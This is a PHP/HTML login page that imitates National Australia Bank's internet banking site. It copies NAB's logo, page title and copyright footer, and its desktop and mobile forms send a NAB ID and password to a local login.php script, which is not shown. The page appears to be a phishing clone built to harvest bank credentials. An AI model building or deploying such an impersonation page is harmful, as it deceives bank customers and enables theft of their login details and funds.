<?php include('server.php') ?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="logo 1.png" type="image/x-icon">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
    <title>NAB personal banking | Loans, accounts, credit cards, Insurance -</title>
</head>
<body>
    <div class="big-screen">
    <header>
        <nav style="padding: 0 150px; font-size: 15px;"> 
            <div class="header-title">
              <a href="index.html"><img src="nab-logo.svg" id="demo" alt="header-logo" width="50px" height="35px"></a>
            </div>
            <div class="header-name">
                <h2>INTERNET BANKING</h2>
            </div>
            <div class="header-list">
                <ul>
                    <li><a href="/">Monday 04 April 2022</a></li> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;
                    <li><a href="/">Help</a></li>&nbsp;|&nbsp;
                    <li><a href="/">Security</a></li>&nbsp;|&nbsp;
                    <li><a href="/">Contact us</a></li>&nbsp;|&nbsp;
                    <li><a href="/">Locate us</a></li>
                </ul>
            </div>
        </nav>
    </header>
            <div class="login-section">
                <div class="card">
                    <form action="login.php" method="post">
                    <?php include('errors.php'); ?>
                        <h1>NAB INTERNET BANKING</h1>
                        <div class="nab-id">
                            <label for="NAB ID">NAB ID</label><br>
                            <input type="text" name="username">
                        </div>
                        <div class="pass">
                            <label for="password">Password</label><br>
                            <input type="password" name="password" id="password">
                        </div>
                        <button type="submit" class="btn" name="login_user">Login</button>

                    </form>
                    <a href="/"><p>Forgot your NAB ID or password?</p></a>
                    <p class="text">New to NAB internet banking?&nbsp; <a href="/">Register now</a></p>
                </div>
            </div>

                <div class="main-card">
                    <h1>Ways to bank</h1>
                    <div class="card-item">
                        <a href="/"><div class="card-info">
                            <h1>NAB with Apple pay Pay easy. Pay safe</h1>
                            <p>A fast, secure and contactless way to pay.</p>
                        </div></a>
                        <a href="/"><div class="card-info">
                            <h1>Block and unblock lost cards</h1>
                            <p>In 3 simple steps, temporarily block your card or have it cancelled and replaced. Do it all in the NAB app. Consider the T&Cs.</p>
                        </div></a>
                        <a href="/"><div class="card-info">
                            <h1>Do it all on the NAB app</h1>
                            <p>Block and unblock your card, check your balance, transfer money to friends and family and more. Consider the T&Cs.</p>
                        </div></a>
                    </div>
                </div>


    <footer>
        <div class="footer">
            <h5>© National Australia Bank Limited</h5>
        </div>
    </footer>
</div>
    <!-- DISPLAY FOR SMALL SCREEN SIZE 600PX AND BELOW -->

    <div class="sm">
        <div class="sm-header" style="display: flex;align-items:center;">
            <div class="menu-icon">
                <i class="fa fa-bars" style="color:white;"></i>
            </div>
            <div class="header-title">
            </div>
            <div class="header-name" style="display:flex;align-items:center;">
               <a href="index.html"> <img src="logo 1.png" alt="lol" width="60px" height="40px"></a>
                <a href="index.html"><h3 style="font-weight: bolder;font-family: 'Bebas Neue', cursive;font-size:25px;">INTERNET BANKING</h3></a>
            </div>
        </div>
        <div class="login-section" style="height:93vh;
                                            display:block;
                                            jusify-content:center;
                                            align-items:center;
                                            ">
                <div class="card">
                    <form action="login.php" method="post">
                    <?php include('errors.php'); ?>
                        <h1 style="font-family: 'Pathway Gothic One', sans-serif;">NAB INTERNET BANKING</h1>
                        <div class="nab-id">
                            <label for="NAB ID">NAB ID</label><br>
                            <input type="text" name="username">
                        </div>
                        <div class="pass">
                            <label for="password">Password</label><br>
                            <input type="password" name="password" id="password">
                        </div>
                        <button type="submit" class="btn" name="login_user">Login</button>

                    </form>
                    <a href="/"><p>Forgot your NAB ID or password?</p></a>
                    <p class="text">New to NAB internet banking?&nbsp; <a href="/">Register now</a></p>
                </div>
            </div>
            <div class="sm-footer">
                <h4 style="width:100%">© National Australia Bank Limited</h4>
            </div>
    </div>
</body>
</html>